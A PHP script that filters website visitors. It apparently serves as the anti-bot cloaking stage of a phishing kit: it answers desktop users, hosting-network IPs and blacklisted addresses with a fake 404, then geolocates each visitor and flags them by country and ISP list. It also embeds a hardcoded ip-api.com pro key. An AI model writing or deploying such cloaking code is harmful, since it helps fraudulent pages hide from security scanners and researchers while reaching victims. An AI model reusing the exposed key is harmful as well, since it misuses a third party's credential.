<?php

session_start();
include($_SERVER['DOCUMENT_ROOT'] . '/config.php');
include('functions.php');

if ($only_mobile == true) {
    function isMobile() {
        return preg_match("/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/", $_SERVER['HTTP_USER_AGENT']);
    }
    
    if (!isMobile()) {
        die(header('HTTP/1.0 404 Not Found'));
    }
} else {
    function isMobile() {
        return preg_match("/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows NT|Macintosh|Windows|Mac/", $_SERVER['HTTP_USER_AGENT']);
    }
    
    if (!isMobile()) {
        die(header('HTTP/1.0 404 Not Found'));
    }
}

$response = json_decode(
    file_get_contents("https://pro.ip-api.com/json/{$_SESSION['ip']}?key=LWKtz4EzQwMJRyQ&fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query"),
    true
);


if ($response && $response['status'] === 'success') {
    $_SESSION['ip_info'] = [
        "city" => $response['city'],
        "zip" => $response['zip'],
        "as" => $response['as'],
        "mobile" => $response['mobile'],
        "proxy" => $response['proxy'],
        "hosting" => $response['hosting'],
        "country" => $response['country'],
    ];

    if ($_SESSION['ip_info']['hosting'] == true) {
        die(header('HTTP/1.0 404 Not Found'));
    }
}

$response = "true";

if (strpos($response, 'true') !== false) {

    if (!in_array($_SERVER['REMOTE_ADDR'], file($_SERVER['DOCUMENT_ROOT'] . '/bl.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))) {
    
        $json = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/isps.json');
        $data = json_decode($json, true);

        $user_ip = $_SERVER['REMOTE_ADDR'];

        $api_url = "http://ip-api.com/json/{$user_ip}";
        $response = file_get_contents($api_url);
        $user_info = json_decode($response, true);

        $user_country_code = $user_info['countryCode'];
        $user_isp = strtolower($user_info['isp']);
        
        if (in_array($user_country_code, $wlCountry)) {
            if (array_key_exists($user_country_code, $data)) {
                $country_data = $data[$user_country_code];
                $isps = $country_data['isps'];

                foreach ($isps as $isp) {
                    if (preg_match('/\b' . preg_quote(strtolower($isp), '/') . '\b/', $user_isp)) {
                        $_SESSION['bot'] = "1";
                        break;
                    } else {
                        $_SESSION['bot'] = "0";
                    }
                }
            } else {
                $_SESSION['bot'] = "0";
            }
        } else {
            $_SESSION['bot'] = "0";
        }
    } else {
        $_SESSION['bot'] = "0";
    }
} else {
    $_SESSION['client'] = "0";
}
?>
